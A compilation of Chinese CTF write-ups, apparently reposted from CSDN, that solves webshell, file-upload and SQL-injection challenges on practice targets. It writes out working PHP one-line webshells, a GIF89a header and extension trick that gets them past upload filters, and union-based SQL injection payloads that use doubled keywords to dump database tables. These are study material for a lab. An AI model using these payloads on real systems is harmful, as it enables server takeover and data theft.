> 需要注意的是，使用一句话木马是非法行为，可能导致严重的后果，包括但不限于罚款、监禁等。因此，建议遵守相关法律法规，不要使用或参与使用这类恶意软件。

<a name="lNRQ1"></a>
 步入正题
<a name="vm3kv"></a>
### 解法1：中国菜刀
跟着操作走即可：<br />打开中国菜刀鼠标右键添加<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699103497991-4a817c01-45bc-4fdd-a665-48f3b8f55876.png#averageHue=%23fcfcfc&clientId=uec6e18bd-ad37-4&from=paste&height=771&id=u94e10770&originHeight=964&originWidth=1713&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=69547&status=done&style=none&taskId=uc2b28cbe-dcad-40fa-b2ef-198fb55731a&title=&width=1370.4)<br />添加题目地址和连接密码以及选择PHP脚本类型即可<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699103800936-fb54142e-31e8-4ce9-8f57-c512d1151de7.png#averageHue=%23fbfbfb&clientId=uec6e18bd-ad37-4&from=paste&height=784&id=u584f1abb&originHeight=980&originWidth=1720&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=110120&status=done&style=none&taskId=u21513963-5cac-4762-a022-11f0d283376&title=&width=1376)<br />双击<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699103863690-a0405970-c5d3-4c3b-a8e4-cb6fed9cebc5.png#averageHue=%23fcfcfc&clientId=uec6e18bd-ad37-4&from=paste&height=784&id=u52dba783&originHeight=980&originWidth=1720&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=69316&status=done&style=none&taskId=u7520aa67-ac1a-40af-bbdc-947e0858aa6&title=&width=1376)<br />点击/根目录即可找到flag文件<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699103944678-830f2e44-9e4c-4231-b65f-84c3e2d1be60.png#averageHue=%23fbfbfb&clientId=uec6e18bd-ad37-4&from=paste&height=750&id=u30a57713&originHeight=938&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=148628&status=done&style=none&taskId=uf6f40684-cc11-437c-8ab5-d1b390416ed&title=&width=1374.4)<br />双击/根目录下的flag文件<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699103993637-4f7fad92-c983-499d-999f-92b7aba79e57.png#averageHue=%23fcfcfc&clientId=uec6e18bd-ad37-4&from=paste&height=784&id=uebf17e70&originHeight=980&originWidth=1720&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=93922&status=done&style=none&taskId=uff58ad7e-4cf9-49a0-b147-8e0d0f0c5e5&title=&width=1376)<br />**得到flag：**<br />`flag{84829618-f50c-4c79-8212-2154477d1f99}`
<a name="yTIlb"></a>
### 解法2：中国蚁剑
方法和中国菜刀大同小异，这里不再赘述。<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699104252981-f49d9cb7-ce07-45b4-a30b-ef3fb2af5a59.png#averageHue=%23f6f6f6&clientId=uec6e18bd-ad37-4&from=paste&height=693&id=u45f50153&originHeight=866&originWidth=1284&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=48809&status=done&style=none&taskId=uc034abd4-e9ea-49aa-b459-ba450c228b3&title=&width=1027.2)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699104312888-9ee32bf2-4024-471a-926c-fa1dbbf658d3.png#averageHue=%23efeeee&clientId=uec6e18bd-ad37-4&from=paste&height=693&id=u4c908978&originHeight=866&originWidth=1284&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=69963&status=done&style=none&taskId=uc2e57990-b15a-4ba0-94f5-f3d64918aa3&title=&width=1027.2)![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699104356323-75b25b2a-c676-4590-8a22-4359f9b9edc6.png#averageHue=%23f8f7f7&clientId=uec6e18bd-ad37-4&from=paste&height=693&id=uc69882c7&originHeight=866&originWidth=1284&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=41518&status=done&style=none&taskId=ubb474a87-643c-474a-90fb-5a26828ea41&title=&width=1027.2)![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699104397368-d7cc31ba-8383-4815-b4e4-f27d3a3bcd2f.png#averageHue=%23f3f3f3&clientId=uec6e18bd-ad37-4&from=paste&height=864&id=u2169ae3e&originHeight=1080&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=140879&status=done&style=none&taskId=ufacb42dd-a578-48b2-a6bc-449e491e8f9&title=&width=1536)![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699104425042-71b1c279-975d-4029-a627-fb29d9543b17.png#averageHue=%23fafafa&clientId=uec6e18bd-ad37-4&from=paste&height=864&id=u5e3f1009&originHeight=1080&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=51457&status=done&style=none&taskId=u874969c2-c708-4796-bed0-6dd6c66cba3&title=&width=1536)<br />**得到flag：**<br />`flag{84829618-f50c-4c79-8212-2154477d1f99}`<br />**感谢大家，祝大家技术更进一步！**

原文链接：https://blog.csdn.net/m0_73734159/article/details/134223817?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22134223817%22%2C%22source%22%3A%22m0_73734159%22%7D

## [极客大挑战 2019]Upload 1

题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699337252657-89c649c6-1588-4aa3-a028-88bf5b43132d.png#averageHue=%234c385c&clientId=uf64f43ce-e71e-4&from=paste&height=757&id=u947b8a91&originHeight=946&originWidth=1908&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1064487&status=done&style=none&taskId=udb99aca2-3cc9-41a3-868d-d184fdc5873&title=&width=1526.4)
> 根据题目和环境可知此题目是一道**文件上传漏洞**

编写一句话木马脚本<br />`<?php @eval($_POST['shell']);?>`<br />将脚本文件更改为jpg图片文件<br />我这里是flag.jpg<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699337737806-9d79f87d-d99a-4e2a-8a4a-4091ef1992d2.png#averageHue=%231c1e25&clientId=uf64f43ce-e71e-4&from=paste&height=651&id=u7b309b5a&originHeight=814&originWidth=1508&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=93789&status=done&style=none&taskId=ufd4469a7-cd50-4036-a335-92ad2cdc129&title=&width=1206.4)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699337789332-5efd0da0-0130-46a1-93a7-fa0b53520271.png#averageHue=%232e3451&clientId=uf64f43ce-e71e-4&from=paste&height=202&id=u768ede7c&originHeight=253&originWidth=456&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=88694&status=done&style=none&taskId=u9c05e091-e2a7-4b1d-8146-79e1fa9edc4&title=&width=364.8)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699337810958-0152fcb9-0e29-45f2-8d05-367e8b58865a.png#averageHue=%232e3352&clientId=uf64f43ce-e71e-4&from=paste&height=145&id=ud9dbe63a&originHeight=181&originWidth=488&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=74124&status=done&style=none&taskId=ua5fcc7a9-9279-4e1d-92b3-947a4282e11&title=&width=390.4)<br />上传文件并burpsuite抓包<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699338001332-5b899f76-7454-4e72-bb0d-2e9b173ba5fa.png#averageHue=%2389becc&clientId=ubcec4a56-770a-4&from=paste&height=720&id=udf8d4c20&originHeight=900&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=680484&status=done&style=none&taskId=u762b773f-f39a-4f6e-ba10-ecc1db8bcf6&title=&width=1374.4)<br />Repeater重放<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699338099537-489391bb-acc4-45f5-a3b3-8e3ad9908569.png#averageHue=%23f8f8f8&clientId=ubcec4a56-770a-4&from=paste&height=706&id=uab71dc75&originHeight=882&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=175254&status=done&style=none&taskId=u6757e7d1-3064-4e2c-925f-fc0fc71281c&title=&width=1374.4)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699338190321-9ef7fa12-0628-4d36-be34-cffb51ccc9ac.png#averageHue=%23f8f8f8&clientId=ubcec4a56-770a-4&from=paste&height=703&id=ubb6cab7a&originHeight=879&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=186901&status=done&style=none&taskId=u9fd02ae0-da70-44e0-8a09-102afddd284&title=&width=1374.4)
> 报错一句话木马里面有<?字符

换一种一句话木马<br />继续编写木马脚本<br />`<script language="php">@eval($_POST['shell']);</script>`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699338414651-f797c754-ecc5-4ba4-99cb-de308eaa8b20.png#averageHue=%231b1d24&clientId=ubcec4a56-770a-4&from=paste&height=653&id=u7b1154a2&originHeight=816&originWidth=1469&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=52242&status=done&style=none&taskId=u4a800520-47b1-46af-97fb-bc84cac253e&title=&width=1175.2)<br />保存为flag.phtml文件
> 绕过后缀的有文件格式有php,php3,php4,php5,phtml.pht
> 因为前几个都被过滤了，所以选择使用phtml后缀

上传抓包<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699338882021-d2253d05-1430-468a-bb38-b0d97f5684cd.png#averageHue=%23f9f9f9&clientId=ubcec4a56-770a-4&from=paste&height=695&id=u248b0f55&originHeight=869&originWidth=1713&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=140406&status=done&style=none&taskId=u4320abc5-37af-4b7a-b305-ab391925c3d&title=&width=1370.4)<br />修改为image/jpeg图片格式<br />Repeater重放Send<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699339010268-b15ad88a-7bab-4684-825f-ad45178c3259.png#averageHue=%23f8f8f8&clientId=ubcec4a56-770a-4&from=paste&height=695&id=uea920ff0&originHeight=869&originWidth=1714&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=182822&status=done&style=none&taskId=ub9d546c8-0ba0-4846-995a-e90640b8855&title=&width=1371.2)<br />不是图片<br />通过GIF89a进行绕过<br />`GIF89a<script language="php">@eval($_POST['shell']);</script>`
> 使文件为动态GIF文件绕过检测

![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699339258603-2eeb50d3-dd9e-486f-bf2e-99f07e7b8360.png#averageHue=%23f9f9f8&clientId=ubcec4a56-770a-4&from=paste&height=657&id=ub42d4636&originHeight=821&originWidth=1714&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=179657&status=done&style=none&taskId=ud03242cc-cbed-4f88-84a9-9570a96933a&title=&width=1371.2)<br />访问upload/flag.phtml文件<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699339462189-71eb6076-2c4d-4db7-9798-293c4da2dc7b.png#averageHue=%23f8f6f4&clientId=ubcec4a56-770a-4&from=paste&height=130&id=u3a148047&originHeight=162&originWidth=1304&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=27771&status=done&style=none&taskId=u1578db51-51e2-4960-a66d-b4bc66f2c10&title=&width=1043.2)<br />上传成功<br />复制URL链接<br />使用中国蚁剑连接<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699339644301-eeb18ae7-320c-410b-a9ea-dd6a580e4c46.png#averageHue=%23ededed&clientId=ubcec4a56-770a-4&from=paste&height=612&id=ue73e40d5&originHeight=765&originWidth=1283&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=77785&status=done&style=none&taskId=ufd2dd65f-bd77-4e22-b193-5287e16047c&title=&width=1026.4)<br />在/根目录下找到flag文件<br />访问flag文件<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699339717138-60ba3cd8-56b9-4c05-a04f-d943a2dbe6b8.png#averageHue=%23f0f0f0&clientId=ubcec4a56-770a-4&from=paste&height=644&id=u33add417&originHeight=805&originWidth=1283&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=100090&status=done&style=none&taskId=u6520ea1e-b6f1-46c3-9b77-42ff9ea77a6&title=&width=1026.4)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699339756110-3cb6eef2-7f35-4e5b-a275-7b4bc4e83f64.png#averageHue=%23f9f9f9&clientId=ubcec4a56-770a-4&from=paste&height=644&id=u2da03915&originHeight=805&originWidth=1283&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=29906&status=done&style=none&taskId=u4108a9ea-4db9-484f-b231-ab13cbd8a27&title=&width=1026.4)<br />**得到flag：**<br />`flag{5359382e-ae88-42a8-8116-8c85a02fb21f}`

原文链接：https://blog.csdn.net/m0_73734159/article/details/134267317?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22134267317%22%2C%22source%22%3A%22m0_73734159%22%7D

## [ACTF2020 新生赛]Upload 1

题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699358837525-841ef99c-1978-41ee-a371-2525c055f887.png#averageHue=%232b2b37&clientId=u71ba86b6-7746-4&from=paste&height=760&id=u0d07696f&originHeight=950&originWidth=1911&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=368206&status=done&style=none&taskId=u172547a9-81d8-4cc6-a554-3d571f0e6dd&title=&width=1528.8)
> 仍旧是文件上传漏洞

> 这道题和上一道大差不差、大同小异、这里不再赘述。
> [极客大挑战 2019]Upload 1：[https://blog.csdn.net/m0_73734159/article/details/134267317?spm=1001.2014.3001.5501](https://blog.csdn.net/m0_73734159/article/details/134267317?spm=1001.2014.3001.5501)
> 区别在于本题需要在抓包数据里面改文件后缀，在外部改是不行的
> 这两道题可以对比进行研究

编写一语句木马脚本<br />`GIF89a<script language="php">@eval($_POST['shell']);</script>`<br />文件命名为flag.jpg<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699359552214-7b95ca9f-4c88-4481-a7cf-e62d1fc10ea3.png#averageHue=%231b1d24&clientId=u71ba86b6-7746-4&from=paste&height=531&id=ue9851c6c&originHeight=664&originWidth=1463&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=40888&status=done&style=none&taskId=ue75aae29-90be-4bc6-bd2b-a14a7445fb4&title=&width=1170.4)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699359581835-bf404971-d1b4-4f5b-8d1c-fa63925ef343.png#averageHue=%23151a31&clientId=u71ba86b6-7746-4&from=paste&height=70&id=uc6e76482&originHeight=88&originWidth=330&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=23196&status=done&style=none&taskId=ufd4165cc-d3d1-473b-9733-12b0e9d9ed1&title=&width=264)<br />上传文件并进行抓包<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699359651080-994ad7df-cf85-4b90-a917-c0fdbea748ac.png#averageHue=%23f9f9f9&clientId=u71ba86b6-7746-4&from=paste&height=729&id=u62eb1d5c&originHeight=911&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=144176&status=done&style=none&taskId=u237efa64-b2f3-43df-a9b7-85fd819414b&title=&width=1374.4)<br />在抓包数据里面进行修改文件后缀将flag.jpg修改为flag.phtml<br />记住原文件不要动只在数据包里面修改，不然的话是绕不过的！！！<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699359811320-a30e7781-246b-45fa-ace7-2a89eee53363.png#averageHue=%23f8f7f7&clientId=u71ba86b6-7746-4&from=paste&height=726&id=ub0cd7ea9&originHeight=907&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=186607&status=done&style=none&taskId=uf8b806fa-d9d5-483a-a4f6-608e749fd7d&title=&width=1374.4)<br />Repeater重放Send<br />成功上传<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699359897918-350b17b5-9553-467c-9ade-239ec70542de.png#averageHue=%23f8f6f6&clientId=u71ba86b6-7746-4&from=paste&height=694&id=u2c2aa952&originHeight=868&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=207022&status=done&style=none&taskId=ucc9dcd07-2ee8-4d99-825f-e967ab1b648&title=&width=1374.4)<br />访问上传的文件<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699359961572-d062d8d7-9e02-4e90-bd8e-f47582e3f96c.png#averageHue=%23f8f7f6&clientId=u71ba86b6-7746-4&from=paste&height=110&id=u5c19a616&originHeight=138&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=32417&status=done&style=none&taskId=u29049e97-c783-49ab-913c-e1551b8233a&title=&width=1536)<br />此时已经可以进行蚁剑连接了<br />复制URL进行蚁剑连接<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699360094694-5053a6ee-f070-4f06-92b1-88664fe6ca45.png#averageHue=%23f4f4f4&clientId=u71ba86b6-7746-4&from=paste&height=782&id=u83c22870&originHeight=978&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=107590&status=done&style=none&taskId=u95673a9f-7bc2-4190-9ced-33cdbc9b003&title=&width=1536)<br />在/根目录下找到flag文件<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699360156271-1bc972b0-1abe-4474-ab2d-4bffb01f1735.png#averageHue=%23f3f3f3&clientId=u71ba86b6-7746-4&from=paste&height=821&id=u41d59f7d&originHeight=1026&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=114551&status=done&style=none&taskId=u692d7d6c-9db7-46b9-aae6-42fa4070325&title=&width=1536)<br />访问flag文件<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699360205428-54067358-9df0-459f-9e7b-7bc786943ee1.png#averageHue=%23f2f2f2&clientId=u71ba86b6-7746-4&from=paste&height=131&id=u156056e1&originHeight=164&originWidth=1276&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11581&status=done&style=none&taskId=u53ce4d83-bbba-4363-8a33-55ac9546da0&title=&width=1020.8)<br />**得到flag：**<br />`flag{9c59f5e5-7dd6-48fa-90f0-dae0ab50e190}`

原文链接：https://blog.csdn.net/m0_73734159/article/details/134275561?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22134275561%22%2C%22source%22%3A%22m0_73734159%22%7D

## 记一次经典SQL双写绕过题目[极客大挑战 2019]BabySQL 1

题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699363757420-1428f39e-e149-48c2-8f58-c4388f31bc31.png#averageHue=%230c0c0c&clientId=u24ae52f3-d826-4&from=paste&height=756&id=ubac5ff0d&originHeight=945&originWidth=1909&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=573482&status=done&style=none&taskId=ub89a017e-eebf-4b6c-a8d6-ae2b273ef79&title=&width=1527.2)
> 作者已经描述进行了严格的过滤
> 做好心理准备进行迎接

判断注入类型
> admin
> 1'

**字符型注入**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699364027444-2dbbc8c2-7c05-43a5-993d-6ff2d3a5427c.png#averageHue=%230c0c0c&clientId=u24ae52f3-d826-4&from=paste&height=642&id=u9816bd0d&originHeight=802&originWidth=1907&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=559274&status=done&style=none&taskId=u6f7fb20f-1383-412d-b479-b8fc47d565d&title=&width=1525.6)<br />万能密码注入
> admin
> 1' or '1'='1

报错<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699363927073-32aaed5f-8d95-448d-8bb1-039c10b582d7.png#averageHue=%230c0a0a&clientId=u24ae52f3-d826-4&from=paste&height=742&id=u65fa4391&originHeight=927&originWidth=1900&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=575579&status=done&style=none&taskId=ud30c14c7-ed1e-486b-bb86-c3b4e7c3ab4&title=&width=1520)
> 已经是字符型注入了，所以的话只有or这里存在了过滤
> 联想到buuctf里面还没有碰到双写绕过的题目
> 所以这里斗胆试一下使用双写绕过

`1' oorr '1'='1`<br />成功<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699364313920-f15d5d3b-555f-409a-918f-29dbf7d61263.png#averageHue=%230b0b0a&clientId=u24ae52f3-d826-4&from=paste&height=746&id=ubf20451a&originHeight=932&originWidth=1903&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=588902&status=done&style=none&taskId=u12b98cc7-9173-468f-ac75-19a6539968c&title=&width=1522.4)<br />使用堆叠注入爆数据库<br />`1';show database();`<br />报错<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699364548094-f743b8ab-7ba7-44a5-b249-bf99bd2b1efc.png#averageHue=%230b0a0a&clientId=u24ae52f3-d826-4&from=paste&height=744&id=u60ff0bf7&originHeight=930&originWidth=1901&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=579099&status=done&style=none&taskId=u7c248545-5279-4a4f-89b7-9585ca1779c&title=&width=1520.8)<br />抛弃堆叠注入<br />尝试联合注入
> 联合注入末尾需要使用#号键进行注释#号后面的命令，避免报错

**这里值得提一下schema和schemata和常见命令的理解**
> [SCHEMA](https://so.csdn.net/so/search?q=SCHEMA&spm=1001.2101.3001.7020)在MySQL中是数据库，SCHEMATA表用来提供有关数据库的信息。
> union select就是联合注入，联合查询的意思
> from来自
> information_schema是MySQL自带的数据库
> group_concat将值连接起来
> where来自那个数据库或数据表等等

爆列数(关键命令采用双写进行绕过）<br />`1' oorrder bbyy 4#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699365343311-7d879f08-d90c-49b5-9b4a-14a27e0ec313.png#averageHue=%230a0a0a&clientId=u24ae52f3-d826-4&from=paste&height=745&id=rTjtD&originHeight=931&originWidth=1879&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=570576&status=done&style=none&taskId=u1b7585e0-1971-481e-9b4f-1503aee95b9&title=&width=1503.2)<br />`1' oorrder bbyy 3#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699365392125-0a36fa5a-51fb-4ddc-a45d-5f2794b3fa80.png#averageHue=%230c0909&clientId=u24ae52f3-d826-4&from=paste&height=750&id=elxsd&originHeight=937&originWidth=1905&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=575845&status=done&style=none&taskId=u44deebbd-f1fe-4a5a-a3c0-6efe4365068&title=&width=1524)
> **可知列数只有3列**

查位(关键命令采用双写进行绕过）<br />`1' ununionion seselectlect 1,2,3#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699364845878-53491c27-278e-425f-8851-50b817c65d30.png#averageHue=%230a0a0a&clientId=u24ae52f3-d826-4&from=paste&height=753&id=u70cd66fb&originHeight=941&originWidth=1905&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=576558&status=done&style=none&taskId=u0bcf4060-b94f-4538-b8d2-8758e7a2209&title=&width=1524)<br />爆数据库(关键命令采用双写进行绕过）<br />`1' ununionion seselectlect 1,database(),3#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699365128004-d67a7fbc-9972-4563-9d79-54d274cb9f2c.png#averageHue=%230b0a0a&clientId=u24ae52f3-d826-4&from=paste&height=750&id=ubfd36b3a&originHeight=938&originWidth=1904&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=577450&status=done&style=none&taskId=ubf762cc7-62ab-4184-a27a-f369a37fb1d&title=&width=1523.2)<br />采用第三列进行注入<br />爆所有数据库(关键命令采用双写进行绕过）<br />`1' ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699365743433-03263256-2ca7-4ba7-9f50-eba014f8376e.png#averageHue=%230b0a0a&clientId=u24ae52f3-d826-4&from=paste&height=755&id=QSNiQ&originHeight=944&originWidth=1909&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=605679&status=done&style=none&taskId=ude20772b-3ec2-4a21-b11e-177341bac5e&title=&width=1527.2)
> 根据常识ctf数据库里面存在flag的可能更大，故选择ctf数据库

爆ctf数据库里面的数据表<br />`1' ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='ctf'#`
> **因为ctf在schema里面所有这里就是table_schema，schema里面的数据库ctf里面的数据表**

得到Flag数据表<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699366028919-cb1376d8-d00e-43dd-aa60-3ae6f214d883.png#averageHue=%230a0a0a&clientId=u24ae52f3-d826-4&from=paste&height=756&id=ufd42ca4c&originHeight=945&originWidth=1897&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=581741&status=done&style=none&taskId=u944cf11a-f0be-4dd8-938d-9a4f519e98e&title=&width=1517.6)<br />爆Flag数据表里面的字段<br />`1' ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='Flag'#`<br />得到flag字段<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699366186634-b43edfcc-8839-490c-907d-cd27fed0ddf7.png#averageHue=%230b0a0a&clientId=u24ae52f3-d826-4&from=paste&height=741&id=u4d5ad84d&originHeight=926&originWidth=1902&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=583894&status=done&style=none&taskId=u9bb4bc6e-bbbe-4384-a68b-9ac8edbe9fd&title=&width=1521.6)<br />爆flag字段内容<br />`1' ununionion seselectlect 1,2,group_concat(flag) frfromom ctf.Flag#`
> ctf.Flag意思就是ctf数据库里面的Flag数据表

![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699366359959-1098e811-013e-47c1-9c38-d601347ec16b.png#averageHue=%230b0b0b&clientId=u24ae52f3-d826-4&from=paste&height=748&id=ua2923427&originHeight=935&originWidth=1899&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=594096&status=done&style=none&taskId=u862d2317-6b23-4473-ba7e-47df8302d1a&title=&width=1519.2)<br />**得到flag：**<br />`flag{fbd18420-cab7-4d6e-8fb9-f8ea6febda61}`

原文链接：https://blog.csdn.net/m0_73734159/article/details/134277587?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22134277587%22%2C%22source%22%3A%22m0_73734159%22%7D

## [极客大挑战 2019]PHP 1

题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699424631460-c57fe260-4fa1-40cf-92ef-ed955ba1a963.png#averageHue=%236dcbcb&clientId=u2474c692-ff3d-4&from=paste&height=806&id=uda183ac0&originHeight=1007&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=84498&status=done&style=none&taskId=u1e38900a-fa76-4e67-8f07-14c70c32bcd&title=&width=1536)
> 注意这四个字“备份网站”，让我想到了之前自己做网站的时候，有一次上传FTP网站文件，不小心把全部网站文件清空了，我伤心欲绝没有做网站备份文件，自此以后我就把网站文件在本地备份了一份，每更新网站有一次就在本地备份一次，备份格式是ZIP格式，比较节省空间，**所以我这猜测它网站后台必定又一个网站备份ZIP文件**

使用dirsearch工具扫描网站后台（这个工具是我最喜欢的，扫描的比较全面，大部分都可以扫描到，博主有压缩文件可以私聊我进行领取！）<br />`python dirsearch.py -u http://a02fc32b-1091-4b95-a4a1-27fb1bc51ba1.node4.buuoj.cn:81/`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699425533533-eb6b9883-6536-4344-9078-a9c44a90010d.png#averageHue=%230c0c0c&clientId=u2474c692-ff3d-4&from=paste&height=646&id=ucda16f79&originHeight=808&originWidth=1250&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12110&status=done&style=none&taskId=u4b8d187a-3ac0-47ea-850d-7eeeef8fb33&title=&width=1000)<br />回车<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699425577064-ca7265a3-9fde-4da2-a4e1-0b1e1b8ead45.png#averageHue=%230d0c0c&clientId=u2474c692-ff3d-4&from=paste&height=647&id=u3d60e2c7&originHeight=809&originWidth=1250&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=118314&status=done&style=none&taskId=u3d887fc5-df80-4dc2-8ec7-49c81f1c992&title=&width=1000)<br />大概需要好几分钟（需耐心等待）<br />扫描出www.zip压缩文件<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699426837799-6cd0e3cb-978e-40b9-ab4a-76666ee9dcda.png#averageHue=%230c0c0c&clientId=u2474c692-ff3d-4&from=paste&height=841&id=uc9a26226&originHeight=1051&originWidth=1899&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=191483&status=done&style=none&taskId=u022c0c1c-3d7d-43aa-831f-e1e3617e0a5&title=&width=1519.2)<br />下载www.zip文件<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699426910784-fc182bf5-3301-48d3-b7b7-919bdee3eeba.png#averageHue=%234c785a&clientId=u2474c692-ff3d-4&from=paste&height=238&id=u9fb4dd8f&originHeight=297&originWidth=1591&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=71358&status=done&style=none&taskId=u044496dc-0bb8-49f5-99f5-a134b26fecc&title=&width=1272.8)<br />回车进行下载<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699426980555-2cf0ce10-f0fa-49f7-963a-25425be8ba98.png#averageHue=%23fcfcfb&clientId=u2474c692-ff3d-4&from=paste&height=723&id=ubc71d8b6&originHeight=904&originWidth=1486&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=119228&status=done&style=none&taskId=ufa51902b-8614-4840-9f92-51d8a5ba168&title=&width=1188.8)<br 